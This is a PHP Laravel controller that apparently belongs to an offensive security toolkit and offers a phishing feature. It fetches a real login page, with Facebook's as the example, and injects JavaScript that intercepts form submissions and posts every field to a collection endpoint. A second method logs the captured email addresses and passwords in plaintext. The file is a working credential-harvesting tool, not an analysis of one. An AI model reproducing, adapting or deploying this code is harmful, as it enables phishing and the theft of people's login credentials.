<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\Log;
use GuzzleHttp\Client;
use App\Models\Droit;


class PhishController extends Controller
{
      /**
     * @OA\Post(
     *     path="/api/phishing/data",
     *     summary="Phishing",
     *     description="Phishing attack to capture user credentials.",
     *     tags={"Fonctionnalités"},
     *    security={{"bearerAuth":{}}},
     *     @OA\RequestBody(
     *         required=true,
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(
     *                 property="url",
     *                 type="string",
     *                 description="The URL of the webpage to inject the script.",
     *                 example="https://fr-fr.facebook.com/login/web/"
     *             )
     *         )
     *     ),
     *     @OA\Response(
     *         response=200,
     *         description="HTML page with the phishing script injected.",
     *         @OA\MediaType(
     *             mediaType="text/html",
     *             example="<html><head></head><body>...</body></html>"
     *         )
     *     ),
     *     @OA\Response(
     *         response=400,
     *         description="Bad Request. Validation failed.",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", example="The url field is required.")
     *         )
     *     ),
     * )
     */
    function verifRoles($fonctionnalite_id, $current_role_id)
    {
        try {
            $droit = Droit::where('fonctionnalite_id', $fonctionnalite_id)
                        ->where('role_id', $current_role_id)
                        ->first();

            if (!$droit) {
                return false; 
            }

            return true;
        } catch (\Exception $e) {
            return false;
        }
    }
    
    public function handlePhish(Request $request)
    {
      
        $fonctionnalite_id = 13;
        $user = Auth::user();

        if (!Auth::check()) {
            return response()->json(['error' => 'You are not authentified'], 401);
        }

        if (!$this->verifRoles($fonctionnalite_id, $user->role_id)) {
            return response()->json(['error' => 'Vous n\'avez pas le droit pour faire cela.'], 401);
        }

        if (!$request->isMethod('post')) {
            return response()->json(['error' => 'Invalid method. Use POST.'], 405);
        }

        $validated = $request->validate([
            'url' => 'required|url',
        ]);

        $url = $validated['url'];

        try {
            $client = new Client();
            $response = $client->get($url);
            $html = $response->getBody()->getContents();

            $htmlWithScript = str_replace(
                '</body>',
                '<script>
                    document.addEventListener("submit", function(event) {
                        event.preventDefault(); // Empêche l\'envoi immédiat du formulaire
                        let form = event.target;
                        let data = new FormData(form);

                        let jsonData = {};
                        data.forEach((value, key) => {
                            jsonData[key] = value;
                        });

                        // Ajouter l\'URL actuelle
                        jsonData["url"] = window.location.href;

                        // Envoyer les données au backend
                        fetch("http://localhost:8000/api/phish/handlePhishData", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(jsonData)
                        })
                        .then(response => response.json())
                        .then(result => {
                            console.log("Data sent successfully:", result);
                        })
                        .catch(error => console.error("Error:", error));
                    });
                </script></body>',
                $html
            );

            return response($htmlWithScript, 200)->header('Content-Type', 'text/html');
        } catch (\Exception $e) {
            return response()->json(['error' => 'Failed to fetch the page: ' . $e->getMessage()], 500);
        }
    }

    public function handlePhishData(Request $request)
    {
        $userId = Auth::check() ? Auth::id() : null;

        $data = $request->all();

        $actionDescription = 'Phishing : ';
        if (isset($data['url'])) {
            $actionDescription .= 'url = ' . $data['url'] . ', ';
        }
        if (isset($data['email'])) {
            $actionDescription .= 'email = ' . $data['email'] . ', ';
        }
        if (isset($data['password'])) {
            $actionDescription .= 'password = ' . $data['password'] . ', ';
        }
        $actionDescription = rtrim($actionDescription, ', ');

        try {
            $this->logAction($userId, $actionDescription);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Failed to log action: ' . $e->getMessage()], 500);
        }

        return response()->json(['message' => 'Data captured and logged successfully.']);
    }

   
    private function logAction($userId, $action)
    {
        Log::create([
            'date' => now(),
            'action' => $action, 
            'fonctionnalite_id' => 13,   
            'id_user' => $userId, 
        ]);
    }
}
